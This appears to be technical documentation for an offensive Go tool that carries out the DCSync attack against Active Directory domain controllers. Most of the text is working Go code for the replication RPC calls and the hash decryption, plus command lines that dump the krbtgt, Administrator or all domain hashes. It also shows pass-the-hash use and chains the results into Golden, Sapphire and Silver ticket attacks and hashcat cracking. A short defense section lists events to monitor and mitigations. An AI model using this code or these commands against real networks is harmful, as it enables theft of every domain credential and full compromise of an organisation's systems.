# DCSync Attack Implementation

> A comprehensive technical deep dive into the DCSync attack and its implementation

## Table of Contents

1. [Overview](#overview)
2. [How DCSync Works](#how-dcsync-works)
3. [Required Privileges](#required-privileges)
4. [Protocol Deep Dive](#protocol-deep-dive)
5. [Implementation Details](#implementation-details)
6. [Credential Decryption](#credential-decryption)
7. [Usage Examples](#usage-examples)
8. [Debugging and Troubleshooting](#debugging-and-troubleshooting)
9. [Defense and Detection](#defense-and-detection)
10. [References](#references)

---

## Overview

**DCSync** is a technique that abuses the Active Directory replication protocol (MS-DRSR) to extract password hashes and Kerberos keys from a Domain Controller without requiring local access. This implementation provides a native Go alternative to tools like `secretsdump.py` and `mimikatz lsadump::dcsync`.

### Why DCSync is Powerful

1. **Remote Execution**: No need to run code on the DC itself
2. **Legitimate Protocol**: Uses the same RPC calls DCs use to replicate
3. **Complete Extraction**: Gets NT hash, LM hash, AES256, AES128, and DES keys
4. **Stealthy**: Looks like normal DC-to-DC replication traffic
5. **No Memory Access**: Doesn't touch LSASS or ntds.dit directly

### Attack Chain Integration

DCSync is typically used to extract:

- **krbtgt hash** → Golden/Diamond/Sapphire Ticket attacks
- **Administrator hash** → Pass-the-Hash lateral movement
- **Machine account hashes** → Silver Ticket attacks
- **All domain hashes** → Credential auditing, mass compromise

---

## How DCSync Works

### The Core Insight

Domain Controllers replicate Active Directory data between each other using MS-DRSR (Directory Replication Service Remote Protocol). DCSync impersonates a Domain Controller to request replication of password data.

### Protocol Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              DCSYNC PROTOCOL FLOW                           │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ATTACKER                                            DOMAIN CONTROLLER      │
│  ┌──────────┐                                        ┌──────────────────┐   │
│  │ Goobeus  │                                        │  DRSUAPI Service │   │
│  │ (dcsync) │                                        │  (DRSR/RPC)      │   │
│  └────┬─────┘                                        └────────┬─────────┘   │
│       │                                                       │             │
│       │  ─── Step 1: TCP Connect (EPM Port 135) ──────────>  │             │
│       │                 Query: "Where is DRSUAPI?"            │             │
│       │  <── Response: "Dynamic port 49152+" ──────────────   │             │
│       │                                                       │             │
│       │  ─── Step 2: RPC Bind (NTLM/SPNEGO Auth) ─────────>  │             │
│       │                 Authenticate as domain user           │             │
│       │  <── Bind ACK ─────────────────────────────────────   │             │
│       │                                                       │             │
│       │  ─── Step 3: IDL_DRSBind ──────────────────────────> │             │
│       │                 Request replication handle            │             │
│       │  <── DRS_HANDLE (opaque pointer) ──────────────────   │             │
│       │                                                       │             │
│       │  ─── Step 4: IDL_DRSCrackNames ────────────────────> │             │
│       │                 "Resolve 'krbtgt' to GUID"            │             │
│       │  <── GUID: {12345678-...} ─────────────────────────   │             │
│       │                                                       │             │
│       │  ─── Step 5: IDL_DRSGetNCChanges ──────────────────> │             │
│       │                 "Replicate secrets for this GUID"     │             │
│       │                 EXOP: REPLICATION_OBJECT              │             │
│       │  <── Encrypted password data ──────────────────────   │             │
│       │         - unicodePwd (encrypted NT hash)              │             │
│       │         - supplementalCredentials (Kerberos keys)     │             │
│       │                                                       │             │
│       │  ─── Step 6: Decrypt with Session Key ────────────   │             │
│       │         Extract NT hash, AES256, AES128               │             │
│       │                                                       │             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Port Usage

| Port | Protocol | Purpose |
|------|----------|---------|
| 135 | TCP | Endpoint Mapper (EPM) - resolves DRSR to dynamic port |
| 49152+ | TCP | DRSR interface (dynamic RPC port) |

---

## Required Privileges

DCSync requires specific replication rights on the domain object:

### Required ACEs

| Permission | GUID | Description |
|------------|------|-------------|
| DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Basic replication |
| DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Includes secrets |

### Default Permission Holders

By default, these permissions are granted to:

| Principal | Why |
|-----------|-----|
| **Domain Admins** | Full domain control |
| **Enterprise Admins** | Forest-wide administration |
| **Administrators** | Built-in admin group |
| **Domain Controllers** | DC-to-DC replication |

### How Attackers Get These Rights

1. **Compromise Domain Admin** - Direct access
2. **WriteDACL on Domain** - Add permissions to controlled account
3. **Delegate Control** - Misconfigured delegation
4. **Azure AD Connect account** - Often has replication rights
5. **Exchange Windows Permissions group** - Historical vulnerability

---

## Protocol Deep Dive

### RPC Interface

DCSync uses the DRSUAPI RPC interface:

```
Interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
Interface Version: 4.0
```

### Step 1: Endpoint Mapping

Before connecting to DRSUAPI, we must discover its dynamic port:

```go
// Connect to endpoint mapper at port 135
endpoint := "ncacn_ip_tcp:" + dc
cc, err := dcerpc.Dial(ctx, endpoint,
    epm.EndpointMapper(ctx,
        net.JoinHostPort(dc, "135"),
        dcerpc.WithInsecure(),
    ))
```

The Endpoint Mapper returns the actual port where DRSUAPI is listening.

### Step 2: RPC Bind with Authentication

Authentication is performed during the RPC bind:

```go
// Add credentials to GSSAPI context
if password != "" {
    gssapi.AddCredential(credential.NewFromPassword(username, password,
        credential.Domain(strings.ToUpper(domain))))
} else if len(ntHash) == 16 {
    // Pass-the-hash authentication
    gssapi.AddCredential(credential.NewFromNTHashBytes(username, ntHash,
        credential.Domain(strings.ToUpper(domain))))
}

// Add authentication mechanisms
gssapi.AddMechanism(ssp.SPNEGO)
gssapi.AddMechanism(ssp.NTLM)

// Create client with sealing (encryption)
client, err := drsuapi.NewDrsuapiClient(ctx, cc,
    dcerpc.WithSeal(),
    dcerpc.WithTargetName(dc))
```

### Step 3: IDL_DRSBind

Establishes a replication handle:

```go
// Client capabilities - tell DC what features we support
clientCaps := drsuapi.ExtensionsInt{
    Flags: drsuapi.ExtGetNCChangesRequestV8 |   // Use V8 request format
           drsuapi.ExtStrongEncryption |         // Support strong crypto
           drsuapi.ExtGetNCChangesReplyV6,       // Expect V6 reply
}

resp, err := client.Bind(ctx, &drsuapi.BindRequest{
    Client: &drsuapi.Extensions{Data: clientCapsBytes},
})

drsHandle := resp.DRS  // Opaque handle for subsequent calls
```

**Extension Flags Explained**:

- `ExtGetNCChangesRequestV8`: Use the V8 request format (most current)
- `ExtStrongEncryption`: Support AES encryption for session
- `ExtGetNCChangesReplyV6`: Can parse V6 reply format with linked values

### Step 4: IDL_DRSCrackNames

Resolves a username to its GUID (required for targeted extraction):

```go
resp, err := client.CrackNames(ctx, &drsuapi.CrackNamesRequest{
    Handle:    drsHandle,
    InVersion: 1,
    In: &drsuapi.MessageCrackNamesRequest{
        Value: &drsuapi.MessageCrackNamesRequest_V1{
            V1: &drsuapi.MessageCrackNamesRequestV1{
                FormatOffered: DSNameFormatNT4AccountName,    // "DOMAIN\user"
                Names:         []string{"DOMAIN\\krbtgt"},
                FormatDesired: DSNameFormatUniqueIDName,       // GUID format
            },
        },
    },
})

guid := resp.Out.Value.(*drsuapi.MessageCrackNamesReply_V1).V1.Result.Items[0].Name
// Returns: "{12345678-1234-1234-1234-123456789012}"
```

### Step 5: IDL_DRSGetNCChanges

The core call that extracts secrets:

```go
resp, err := client.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
    Handle:    drsHandle,
    InVersion: 8,
    In: &drsuapi.MessageGetNCChangesRequest{
        Value: &drsuapi.MessageGetNCChangesRequest_V8{
            V8: &drsuapi.MessageGetNCChangesRequestV8{
                // Object we want to replicate
                NC: &drsuapi.DSName{
                    GUID: parsedGUID,
                },
                // Replication flags
                Flags: drsuapi.InitSync |                    // Initial sync
                       drsuapi.GetAncestor |                 // Include parent
                       drsuapi.GetAllGroupMembership |       // All groups
                       drsuapi.WritableReplica,              // Writable copy
                // Extended operation - single object with secrets
                ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
                MaxObjectsCount: 1,
            },
        },
    },
})
```

**Key Parameters**:

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `NC.GUID` | Target GUID | Which object to replicate |
| `Flags` | `InitSync \| GetAncestor \| ...` | Control replication behavior |
| `ExtendedOperation` | `ReplicationObject` | Request single object's secrets |
| `MaxObjectsCount` | 1 | Limit response size |

**Extended Operations**:

- `0` (None): Full NC replication
- `5` (`EXOP_REPL_OBJ`): Single object replication
- `6` (`EXOP_REPL_SECRETS`): Single object with secrets (alternative)

---

## Implementation Details

### File Structure

```
pkg/dcsync/
├── dcsync.go    # High-level API (DCSync, DCSyncAll, DCSyncMultiple)
├── drsr.go      # Low-level DRSR client implementation
└── doc.go       # Package documentation
```

### Data Structures

```go
// DCSyncRequest - Input configuration
type DCSyncRequest struct {
    // Target DC
    DC     string
    Domain string

    // Authentication
    Username string
    Password string
    NTHash   []byte // Pass-the-hash support

    // What to dump
    TargetUser string // e.g., "krbtgt", "Administrator"
    TargetDN   string // Or full DN
}

// DCSyncResult - Extracted credentials
type DCSyncResult struct {
    // User info
    SAMAccountName string
    ObjectSID      string

    // Credentials
    NTHash  []byte // 16 bytes - NTLM hash
    LMHash  []byte // 16 bytes - LM hash (usually empty)
    AES256  []byte // 32 bytes - AES256-CTS-HMAC-SHA1-96
    AES128  []byte // 16 bytes - AES128-CTS-HMAC-SHA1-96
    DESKeys []byte // 8 bytes - Legacy DES keys
}
```

### Single User vs Full Domain Dump

| Mode | RPC Call | Extended Operation | Result |
|------|----------|-------------------|--------|
| `--user` | GetNCChanges | `EXOP_REPL_SECRETS` | Single user with all keys |
| `--all` | GetNCChanges | None (full NC) | All users, NT hash only |

**Why `--all` doesn't get Kerberos keys**: Full NC replication doesn't return `supplementalCredentials` because:

1. It would be massive data volume
2. DCs optimize replication by excluding some attributes
3. `supplementalCredentials` is a "secret" attribute requiring EXOP

---

## Credential Decryption

### Understanding the Encryption Layers

Credentials in AD replication are protected by multiple encryption layers:

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        CREDENTIAL ENCRYPTION LAYERS                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Layer 1: RPC Session Encryption                                            │
│  ┌────────────────────────────────────────────────────────────────────┐     │
│  │  Negotiated during RPC Bind (NTLM/Kerberos session key)            │     │
│  │  dcerpc.WithSeal() enables this                                    │     │
│  │  Stripped automatically by RPC layer                               │     │
│  └────────────────────────────────────────────────────────────────────┘     │
│                                                                             │
│  Layer 2: Attribute-Level Encryption (unicodePwd, supplementalCredentials)  │
│  ┌────────────────────────────────────────────────────────────────────┐     │
│  │  Encrypted using session key derived from RPC session              │     │
│  │  Uses MD5 + RC4 or AES depending on negotiation                    │     │
│  │  drsuapi.DecryptHash() handles this                                │     │
│  └────────────────────────────────────────────────────────────────────┘     │
│                                                                             │
│  Layer 3: RID-Based Encryption (NT hash within unicodePwd)                  │
│  ┌────────────────────────────────────────────────────────────────────┐     │
│  │  Final layer uses user's RID as diversifier                        │     │
│  │  Requires extracting RID from objectSid first                      │     │
│  │  XOR-based with DES key derived from RID                           │     │
│  └────────────────────────────────────────────────────────────────────┘     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Decrypting unicodePwd (NT Hash)

```go
// Step 1: Extract RID from objectSid
// SID: S-1-5-21-1234567890-1234567890-1234567890-500
//                                                ^^^ RID = 500
sid := result.ObjectSID
parts := strings.Split(sid, "-")
rid := parts[len(parts)-1]  // "500"

// Step 2: Decrypt using session key and RID
// The go-msrpc library handles this internally
pwd, err := drsuapi.DecryptHash(ctx, rid, encryptedPwd)
// pwd is now the 16-byte NT hash
```

### Decrypting supplementalCredentials

The `supplementalCredentials` attribute contains Kerberos keys in USER_PROPERTIES format:

```
supplementalCredentials Structure:
┌────────────────────────────────────────────────────┐
│ USER_PROPERTIES                                    │
│ ├── PropertyCount                                  │
│ └── Properties[]                                   │
│     ├── PropertyName: "Primary:Kerberos-Newer-Keys"│
│     │   └── Value: KERB_STORED_CREDENTIAL_NEW      │
│     │       ├── Credentials[]                      │
│     │       │   ├── KeyType: 18 (AES256)           │
│     │       │   │   KeyData: [32 bytes]            │
│     │       │   ├── KeyType: 17 (AES128)           │
│     │       │   │   KeyData: [16 bytes]            │
│     │       │   └── KeyType: 3 (DES)               │
│     │       │       KeyData: [8 bytes]             │
│     │       └── OldCredentials[] (previous keys)   │
│     └── PropertyName: "Primary:Kerberos"           │
│         └── Value: KERB_STORED_CREDENTIAL (legacy) │
└────────────────────────────────────────────────────┘
```

```go
// Decrypt the blob
creds, err := drsuapi.DecryptData(ctx, encryptedSupp)

// Parse USER_PROPERTIES structure
props := samr.UserProperties{}
ndr.Unmarshal(creds, &props, ndr.Opaque)

// Extract Kerberos keys
for _, prop := range props.UserProperties {
    if prop.PropertyName == "Primary:Kerberos-Newer-Keys" {
        kerbNew := prop.PropertyValue.Value.(*samr.UserProperty_PropertyValue_KerberosStoredCredentialNew)
        for _, key := range kerbNew.Credentials {
            switch key.KeyType {
            case 18: // AES256
                result.AES256 = key.KeyData
            case 17: // AES128
                result.AES128 = key.KeyData
            case 3:  // DES
                result.DESKeys = key.KeyData
            }
        }
    }
}
```

### Kerberos Key Types

| KeyType | Name | Length | Use |
|---------|------|--------|-----|
| 18 | aes256-cts-hmac-sha1-96 | 32 bytes | Modern Kerberos (default) |
| 17 | aes128-cts-hmac-sha1-96 | 16 bytes | Fallback AES |
| 23 | rc4-hmac | 16 bytes | Same as NT hash |
| 3 | des-cbc-md5 | 8 bytes | Legacy (deprecated) |
| 1 | des-cbc-crc | 8 bytes | Legacy (deprecated) |

---

## Usage Examples

### Single User Dump

```bash
# Get krbtgt credentials (for Golden Ticket attacks)
goobeus -d corp.local -u admin -p 'AdminPass!' dcsync \
  --user krbtgt --dc dc01.corp.local

# Get Administrator (for Pass-the-Hash)
goobeus -d corp.local -u admin -p 'AdminPass!' dcsync \
  --user Administrator --dc dc01.corp.local
```

### Using Pass-the-Hash

```bash
# No password needed - just the NT hash
goobeus -d corp.local -u admin -r aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f... \
  dcsync --user krbtgt --dc dc01.corp.local
```

### Full Domain Dump

```bash
# Dump ALL users (like secretsdump.py -just-dc)
goobeus -d corp.local -u admin -p 'AdminPass!' dcsync \
  --all --dc dc01.corp.local
```

### Output Format

**Single User:**

```
═══════════════════════════════════════════════════════════════
  EXTRACTED CREDENTIALS
═══════════════════════════════════════════════════════════════
  User: krbtgt
  SID:  S-1-5-21-1234567890-1234567890-1234567890-502

  NT Hash:  ad4bb50597cf43086230fdb25ecee14a
  AES256:   6c69306119a5085703cc4f4bf55623da8966c0538303ccb01657d163889b86ae
  AES128:   b2def8c3d58dcd00692ea6492806d294

  Secretsdump format:
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad4bb50597cf43086230fdb25ecee14a:::
    krbtgt:aes256-cts-hmac-sha1-96:6c69306119a5085703cc4f4bf55623da...
    krbtgt:aes128-cts-hmac-sha1-96:b2def8c3d58dcd00692ea6492806d294
```

**Full Dump:**

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ad4bb50597cf43086230fdb25ecee14a:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1a2803ab98942ee503680dd3de3cceb2:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

### Library Usage

```go
import (
    "github.com/goobeus/goobeus/pkg/dcsync"
)

// Single user
result, err := dcsync.DCSync(ctx, &dcsync.DCSyncRequest{
    DC:         "dc01.corp.local",
    Domain:     "corp.local",
    Username:   "admin",
    Password:   "AdminPass!",
    TargetUser: "krbtgt",
})

fmt.Printf("NT Hash: %x\n", result.NTHash)
fmt.Printf("AES256:  %x\n", result.AES256)

// Use for Sapphire Ticket
sapphireResult, _ := forge.ForgeSapphireTicket(ctx, &forge.SapphireTicketRequest{
    KrbtgtAES256: result.AES256,
    // ...
})
```

---

## Debugging and Troubleshooting

### Common Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `STATUS_ACCESS_DENIED` | Insufficient privileges | Verify account has replication rights |
| `RPC_S_SERVER_UNAVAILABLE` | Can't reach DC | Check network/firewall, verify port 135 open |
| `DsBind returned error: 8453` | Access denied to DRSR | Need replication rights |
| `CrackNames failed with status: 2` | User not found | Verify username exists |

### Debug Output

Enable verbose logging to trace the protocol flow:

```bash
# The implementation prints debug information by default
goobeus -d corp.local -u admin -p pass dcsync --user krbtgt --dc dc01

[*] Connecting to DC: dc01.corp.local
[*] Auth: CORP.LOCAL\admin @ dc01.corp.local
[*] Connecting to endpoint: ncacn_ip_tcp:dc01.corp.local
[+] Connected to DRSR interface
[*] Calling DsBind...
[+] Got DRS handle
[*] Resolving krbtgt...
[*] CrackNames lookup: CORP\krbtgt
[+] Got GUID: {12345678-1234-1234-1234-123456789012}
[*] Calling DsGetNCChanges for secrets...
[*] Decrypting hash for RID: 502
[+] Successfully extracted credentials!
```

### Network Capture Analysis

You can capture DCSync traffic with Wireshark:

1. Filter: `dcerpc || epm`
2. Look for:
   - EPM bind on port 135
   - DRSUAPI bind on dynamic port
   - DRSBind request/response
   - DRSCrackNames request/response
   - DRSGetNCChanges request/response

---

## Defense and Detection

### Event Log Sources

| Event ID | Log | Description |
|----------|-----|-------------|
| 4662 | Security | Object access (look for Replicating Directory Changes) |
| 4624 | Security | Logon from unexpected IP performing replication |
| 4929 | DFS Replication | Unusual replication partner |

### What to Monitor

1. **Non-DC IPs Making Replication Calls**
   - DCs should only replicate with other DCs
   - Alert on unknown IPs using DRSR

2. **Accounts Using Replication Rights**
   - Monitor use of DS-Replication-Get-Changes-All
   - Alert on non-DC accounts

3. **Unusual Times**
   - Replication at 3 AM from workstation?
   - Correlate with normal business hours

### Mitigations

| Mitigation | Description |
|------------|-------------|
| **Limit Replication Rights** | Audit and remove unnecessary replication permissions |
| **Monitor DRSR Traffic** | Alert on non-DC sources |
| **Network Segmentation** | Restrict access to DC RPC ports |
| **AdminSDHolder** | Protect sensitive groups from permission changes |
| **Privileged Access Workstations** | Limit where admin activities occur |

### Honeypot Detection

Create a honeypot account with replication rights but monitor all access:

```powershell
# Create honeypot
New-ADUser -Name "svc_backup_repl" -Enabled $false

# Grant replication rights (to lure attackers)
# But monitor Event ID 4662 for this specific account
```

---

## Cross-Platform Support

| Platform | Status | Notes |
|----------|--------|-------|
| Linux | ✅ Full | Primary development platform |
| Windows | ✅ Full | Works with NTLM/Kerberos auth |
| macOS | ⚠️ Untested | Should work (uses Go RPC) |

---

## Use Cases

### 1. Golden Ticket Prerequisites

```bash
# Get krbtgt hash for Golden Ticket
goobeus dcsync --user krbtgt --dc dc01

# Use in Golden Ticket
goobeus golden --krbtgt <hash> --sid S-1-5-21-... --user admin
```

### 2. Sapphire Ticket Attack Chain

```bash
# DCSync for AES256 key (required for Sapphire)
goobeus dcsync --user krbtgt --dc dc01

# The AES256 from DCSync is perfect for Sapphire
goobeus sapphire --krbtgt-aes <aes256> --impersonate Administrator
```

### 3. Domain Credential Audit

```bash
# Dump all hashes for password audit
goobeus dcsync --all --dc dc01 > hashes.txt

# Crack with hashcat
hashcat -m 1000 hashes.txt rockyou.txt
```

### 4. Lateral Movement

```bash
# Get target machine account
goobeus dcsync --user 'DC01$' --dc dc01

# Silver Ticket to DC01's services
goobeus silver --rc4 <hash> --service cifs/dc01.corp.local
```

---

## References

### Specifications

- [MS-DRSR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/) - Directory Replication Service Remote Protocol
- [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpce/) - Remote Procedure Call Extensions
- [MS-SAMR](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/) - Security Account Manager Remote Protocol

### Tools and Research

- [Mimikatz](https://github.com/gentilkiwi/mimikatz) - Original DCSync implementation by Benjamin Delpy
- [Impacket secretsdump.py](https://github.com/fortra/impacket) - Python implementation
- [go-msrpc](https://github.com/oiweiwei/go-msrpc) - Go MSRPC library used in this implementation

### Related Documentation

- [SAPPHIRE.md](SAPPHIRE.md) - Using DCSync output for Sapphire tickets
- [ATTACKS.md](ATTACKS.md) - Overview of Kerberos attacks
- [DELEGATION.md](DELEGATION.md) - Delegation abuse techniques
